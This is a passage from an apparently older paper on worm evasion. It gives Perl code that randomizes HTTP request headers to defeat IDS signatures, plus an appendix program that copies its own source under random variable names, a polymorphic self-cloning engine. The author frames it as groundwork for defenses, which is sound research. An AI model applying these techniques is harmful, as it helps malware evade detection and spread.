&nbsp; <span style="color: #cc66cc;">6</span> &nbsp;<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; Proto &nbsp; &nbsp;<span style="color: #339933;">=&gt;</span> <span style="color: #ff0000;">&quot;tcp&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; <span style="color: #cc66cc;">7</span> &nbsp;<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#41;</span> <span style="color: #339933;">||</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/die.html"><span style="color: #000066;">die</span></a> <span style="color: #ff0000;">&quot;trying&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">8</span> &nbsp;<span style="color: #339933;">:</span> <br/>
&nbsp; <span style="color: #cc66cc;">9</span> &nbsp;<span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> <span style="color: #0000ff;">$remote</span> <span style="color: #ff0000;">&quot;GET / HTTP/1.0<br/>
&nbsp; 10 : Connection: Keep-Alive<br/>
&nbsp; 11 : User-Agent: Mozilla/4.73 (Win95; U)<br/>
&nbsp; 12 : Host: $ARGV[0]:$ARGV[1]<br/>
&nbsp; 13 : Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*<br/>
&nbsp; 14 : Accept-Encoding: gzip<br/>
&nbsp; 15 : Accept-Language: en<br/>
&nbsp; 16 : Accept-Charset: iso-8859-1,*,utf-8<span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">17</span> <span style="color: #339933;">:</span> <br/>
&nbsp; <span style="color: #cc66cc;">18</span> <span style="color: #339933;">:</span> <span style="color: #b1b100;">while</span> <span style="color: black;">&#40;</span> <span style="color: #339933;">&lt;</span><span style="color: #0000ff;">$remote</span><span style="color: #339933;">&gt;</span> <span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> <span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<p>Although the code above does generate a normal looking request you do not have to expect it in any worm code any time soon. If the request is the same for every connection it will just become a different fingerprint left behind and will not add anything useful to the worm. Below is code that shows different ways one request can be altered to look slightly different every time to make it harder to find something that is specific to the worm only.</p>
<div class="perl" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; <span style="color: #cc66cc;">1</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #000000; font-weight: bold;">use</span> IO<span style="color: #339933;">::</span><span style="color: #006600;">Socket</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">2</span> &nbsp;<span style="color: #339933;">:</span> <br/>
&nbsp; <span style="color: #cc66cc;">3</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">@choices_agent_ver</span> <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span> <span style="color: #ff0000;">&quot;4.7&quot;</span><span style="color: #339933;">,</span> &nbsp;<span style="color: #ff0000;">&quot;4.72&quot;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;4.73&quot;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;4.74&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; <span style="color: #cc66cc;">4</span> &nbsp;<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">&quot;4.75&quot;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;4.76&quot;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;4.78&quot;</span> <span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">5</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">$choices_agent_len</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">@choices_agent_ver</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">6</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">$choice_agent_nr</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #0000ff;">$choices_agent_len</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">7</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">$choice_agent</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">$choices_agent_ver</span><span style="color: black;">&#91;</span><span style="color: #0000ff;">$choice_agent_nr</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">8</span> &nbsp;<span style="color: #339933;">:</span> <br/>
&nbsp; <span style="color: #cc66cc;">9</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #339933;">@</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/accept.html"><span style="color: #000066;">accept</span></a> <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span> <span style="color: #ff0000;">&quot;image/gif&quot;</span><span style="color: #339933;">,</span> &nbsp;<span style="color: #ff0000;">&quot;image/x-xbitmap&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; <span style="color: #cc66cc;">10</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;image/jpeg&quot;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;image/pjpeg&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; <span style="color: #cc66cc;">11</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;image/png&quot;</span> <span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">12</span> <span style="color: #339933;">:</span> <span style="color: #0000ff;">$acceptlen</span> <span style="color: #339933;">=</span> <span style="color: #339933;">@</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/accept.html"><span style="color: #000066;">accept</span></a><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">13</span> <span style="color: #339933;">:</span> <br/>
&nbsp; <span style="color: #cc66cc;">14</span> <span style="color: #339933;">:</span> <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$cnt</span> <span style="color: #339933;">=</span> <span style="color: #cc66cc;">0</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$cnt</span> <span style="color: #339933;">&lt;=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #0000ff;">$acceptlen</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$cnt</span><span style="color: #339933;">++</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">15</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$grab</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #0000ff;">$nacceptlen</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">16</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$acceptstring</span> <span style="color: #339933;">.=</span> <span style="color: #ff0000;">&quot;$accept[$grab], &quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">17</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/splice.html"><span style="color: #000066;">splice</span></a> <span style="color: black;">&#40;</span><span style="color: #339933;">@</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/accept.html"><span style="color: #000066;">accept</span></a><span style="color: #339933;">,</span> <span style="color: #0000ff;">$grab</span><span style="color: #339933;">,</span> <span style="color: #cc66cc;">1</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">18</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$nacceptlen</span> <span style="color: #339933;">=</span> <span style="color: #339933;">@</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/accept.html"><span style="color: #000066;">accept</span></a><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">19</span> <span style="color: #339933;">:</span> <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">20</span> <span style="color: #339933;">:</span> <br/>
&nbsp; <span style="color: #cc66cc;">21</span> <span style="color: #339933;">:</span> <span style="color: #0000ff;">$switchencoding</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">2</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">22</span> <span style="color: #339933;">:</span> <br/>
&nbsp; <span style="color: #cc66cc;">23</span> <span style="color: #339933;">:</span> <span style="color: #0000ff;">$request</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">&quot;GET / HTTP/1.0<br/>
&nbsp; 24 : Connection: Keep-Alive<br/>
&nbsp; 25 : User-Agent: Mozilla/$choice_agent (Win95; U)<br/>
&nbsp; 26 : Host: $ARGV[0]:$ARGV[1]<br/>
&nbsp; 27 : Accept: $acceptstring*/*<br/>
&nbsp; 28 : &quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">29</span> <span style="color: #339933;">:</span> <span style="color: #0000ff;">$request</span> <span style="color: #339933;">.=</span> <span style="color: #ff0000;">&quot;Accept-Encoding: gzip<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span> <span style="color: #b1b100;">if</span> <span style="color: #0000ff;">$switchencoding</span> <span style="color: #339933;">==</span> <span style="color: #cc66cc;">0</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">30</span> <span style="color: #339933;">:</span> <span style="color: #0000ff;">$request</span> <span style="color: #339933;">.=</span> <span style="color: #ff0000;">&quot;Accept-Language: en<br/>
&nbsp; 31 : Accept-Charset: iso-8859-1,*,utf-8<span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">32</span> <span style="color: #339933;">:</span> <br/>
&nbsp; <span style="color: #cc66cc;">33</span> <span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> <span style="color: #0000ff;">$request</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">34</span> <span style="color: #339933;">:</span><br/>
&nbsp; <span style="color: #cc66cc;">35</span> <span style="color: #339933;">:</span> <span style="color: #0000ff;">$remote</span> <span style="color: #339933;">=</span> IO<span style="color: #339933;">::</span><span style="color: #006600;">Socket</span><span style="color: #339933;">::</span><span style="color: #006600;">INET</span><span style="color: #339933;">-&gt;</span><span style="color: #000000; font-weight: bold;">new</span> <span style="color: black;">&#40;</span><br/>
&nbsp; <span style="color: #cc66cc;">36</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; PeerAddr <span style="color: #339933;">=&gt;</span> <span style="color: #ff0000;">&quot;$ARGV[0]&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; <span style="color: #cc66cc;">37</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; PeerPort <span style="color: #339933;">=&gt;</span> <span style="color: #ff0000;">&quot;$ARGV[1]&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; <span style="color: #cc66cc;">38</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; Proto &nbsp; &nbsp;<span style="color: #339933;">=&gt;</span> <span style="color: #ff0000;">&quot;tcp&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; <span style="color: #cc66cc;">39</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#41;</span> <span style="color: #339933;">||</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/die.html"><span style="color: #000066;">die</span></a> <span style="color: #ff0000;">&quot;trying&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">40</span> <span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> <span style="color: #0000ff;">$remote</span> <span style="color: #ff0000;">&quot;$request&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">41</span> <span style="color: #339933;">:</span> <br/>
&nbsp; <span style="color: #cc66cc;">42</span> <span style="color: #339933;">:</span> <span style="color: #b1b100;">while</span> <span style="color: black;">&#40;</span> <span style="color: #339933;">&lt;</span><span style="color: #0000ff;">$remote</span><span style="color: #339933;">&gt;</span> <span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> <span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<p>The code above show cases three methods a request may be changed, yet still be valid and indistinguishable from GET requests other visitors to a site may make.</p>
<ol>
<li>In line 3 to 7 a random User-Agent version is chosen and put into the GET request.</li>
<li>In line 9 to 12 a random amount of random Accept entries are chosen and put into the GET request.</li>
<li>In line 21 a random 0 or 1 is created to decide if the Accept-Encoding entry should be added or not to the GET request.</li>
</ol>
<p>Line 23 to 31 puts all of this together into one request to send to the server. The more changes are made, the harder it becomes to come up with a way to recognize something that is unique to the worm. If a worm uses several different browser "footprints" that are all very different, yet are still legitimate, it will be impossible to create a IDS signature for it as it will cause false positives to occur. Consider a normal person using their web browser and their surfing looks like a worm request? The log coming from the IDS system will be useless. By shutting out the worm you shut out normal users and by allowing normal users you are allowing the worm.</p>
<h2><a name="p7"></a>7 Closing</h2>
<p>This raises an interesting issue: how can you find out if a particular server has been infected or not if after this paper is finished and everything has been implemented?</p>
<p>Right now I don't know of any ways to be completely different every time, but possible only to locate by its brother and sister infections. The one excludes the other, which creates a sliver of hope for anyone hoping to at least retain the capability to locate a worm.</p>
<p>The frustrating part is that one can write a worm to be like a suicide bomber. A worm could be made to repetitively infect vulnerable computers creating the effect of having the computers the worms live on collapse under the pressure of the processes and bandwidth involved.</p>
<p>I would like to add a few things before I let the appendix end this paper. For one, the code in this paper is anything but cut and paste. Anyone with half a brain can figure out that you could search a hard drive for a file with X amount of "int(rand("'s.</p>
<p>Secondly, The code is offered as an example from which one can jump to create antidotes. The paper is great as a beginning to think up more intricate and better implementations to find a solution for.</p>
<p>Thirdly, consider taking all I wrote and finding ways around it: think of how there are empty lines between sub routines, how the program is ordered in the way of a normal program. Can the order of the sub routines and the amount of lines they each have give us something to recognize the worm by? This paper gives us something to work with.</p>
<h2><a name="pa"></a>Appendix</h2>
<h3><a name="pa1"></a>A.1 Example program for chapter 2</h3>
<div class="perl" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; <span style="color: #cc66cc;">1</span> &nbsp;<span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/open.html"><span style="color: #000066;">open</span></a> <span style="color: black;">&#40;</span>SELF<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;&lt;$0&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">2</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">@self</span> <span style="color: #339933;">=</span> <span style="color: #009999;">&lt;SELF&gt;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">3</span> &nbsp;<span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/close.html"><span style="color: #000066;">close</span></a> <span style="color: black;">&#40;</span>SELF<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">4</span> &nbsp;<span style="color: #339933;">:</span><br/>
&nbsp; <span style="color: #cc66cc;">5</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">@switchthese</span> <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;OUT2FILE&quot;</span><span style="color: #339933;">,</span> &nbsp; &nbsp; <span style="color: #ff0000;">&quot;SELF&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; <span style="color: #cc66cc;">6</span> &nbsp;<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;addspacing&quot;</span><span style="color: #339933;">,</span> &nbsp; <span style="color: #ff0000;">&quot;createsubstitutes&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; <span style="color: #cc66cc;">7</span> &nbsp;<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;coin&quot;</span><span style="color: #339933;">,</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;counter&quot;</span><span style="color: #339933;">,</span> &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">&quot;entry&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; <span style="color: #cc66cc;">8</span> &nbsp;<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;length&quot;</span><span style="color: #339933;">,</span> &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;line&quot;</span><span style="color: #339933;">,</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;randomchar&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; <span style="color: #cc66cc;">9</span> &nbsp;<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;randomlen&quot;</span><span style="color: #339933;">,</span> &nbsp; &nbsp;<span style="color: #ff0000;">&quot;randomvar&quot;</span><span style="color: #339933;">,</span> &nbsp; &nbsp;<span style="color: #ff0000;">&quot;self&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; <span style="color: #cc66cc;">10</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;swcounter&quot;</span><span style="color: #339933;">,</span> &nbsp; &nbsp;<span style="color: #ff0000;">&quot;switchthese&quot;</span><span style="color: #339933;">,</span> &nbsp;<span style="color: #ff0000;">&quot;variable&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">11</span> <span style="color: #339933;">:</span><br/>
&nbsp; <span style="color: #cc66cc;">12</span> <span style="color: #339933;">:</span> <span style="color: #0000ff;">&amp;createsubstitutes</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">13</span> <span style="color: #339933;">:</span><br/>
&nbsp; <span style="color: #cc66cc;">14</span> <span style="color: #339933;">:</span> <span style="color: #0000ff;">$dev</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">&quot;dev&quot;</span> <span style="color: #339933;">.</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">500</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">15</span> <span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> <span style="color: #ff0000;">&quot;Spawned a clone to $dev<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">16</span> <span style="color: #339933;">:</span><br/>
&nbsp; <span style="color: #cc66cc;">17</span> <span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/open.html"><span style="color: #000066;">open</span></a> <span style="color: black;">&#40;</span>OUT2FILE<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;&gt;$dev&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">18</span> <span style="color: #339933;">:</span> <span style="color: #b1b100;">foreach</span> <span style="color: #0000ff;">$line</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">@self</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">19</span> <span style="color: #339933;">:</span> &nbsp; &nbsp;<span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$swcounter</span> <span style="color: #339933;">=</span> <span style="color: #cc66cc;">0</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$swcounter</span> <span style="color: #339933;">&lt;=</span> <span style="color: #0000ff;">$length</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$swcounter</span><span style="color: #339933;">++</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">20</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$line</span> <span style="color: #339933;">=~</span> <span style="color: #009966; font-style: italic;">s/$switchthese[$swcounter]/$randomvar[$swcounter]/g</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">21</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">&amp;addspacing</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">22</span> <span style="color: #339933;">:</span> &nbsp; &nbsp;<span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">23</span> <span style="color: #339933;">:</span> &nbsp; &nbsp;<a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> OUT2FILE <span style="color: #0000ff;">$line</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">24</span> <span style="color: #339933;">:</span> <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">25</span> <span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/close.html"><span style="color: #000066;">close</span></a> <span style="color: black;">&#40;</span>OUT2FILE<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">26</span> <span style="color: #339933;">:</span><br/>
&nbsp; <span style="color: #cc66cc;">27</span> <span style="color: #339933;">:</span> <span style="color: #000000; font-weight: bold;">sub</span> createsubstitutes <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">28</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$length</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">@switchthese</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$length</span><span style="color: #339933;">--;</span><br/>
&nbsp; <span style="color: #cc66cc;">29</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$counter</span> <span style="color: #339933;">=</span> <span style="color: #cc66cc;">0</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$counter</span> <span style="color: #339933;">&lt;=</span> <span style="color: #0000ff;">$length</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$counter</span><span style="color: #339933;">++</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">30</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff;">$randomlen</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">4</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">31</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff;">$randomlen</span> <span style="color: #339933;">+=</span> <span style="color: #cc66cc;">5</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">32</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$variable</span> <span style="color: #339933;">=</span> <span style="color: #cc66cc;">0</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$variable</span> <span style="color: #339933;">&lt;=</span> <span style="color: #0000ff;">$randomlen</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$variable</span><span style="color: #339933;">++</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">33</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$randomchar</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">26</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">34</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$randomchar</span> <span style="color: #339933;">+=</span> <span style="color: #cc66cc;">97</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">35</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$randomvar</span><span style="color: black;">&#91;</span><span style="color: #0000ff;">$counter</span><span style="color: black;">&#93;</span> <span style="color: #339933;">.=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/chr.html"><span style="color: #000066;">chr</span></a><span style="color: black;">&#40;</span><span style="color: #0000ff;">$randomchar</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">36</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">37</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">38</span> <span style="color: #339933;">:</span> <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">39</span> <span style="color: #339933;">:</span><br/>
&nbsp; <span style="color: #cc66cc;">40</span> <span style="color: #339933;">:</span> <span style="color: #000000; font-weight: bold;">sub</span> addspacing <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">41</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$coin</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">3</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
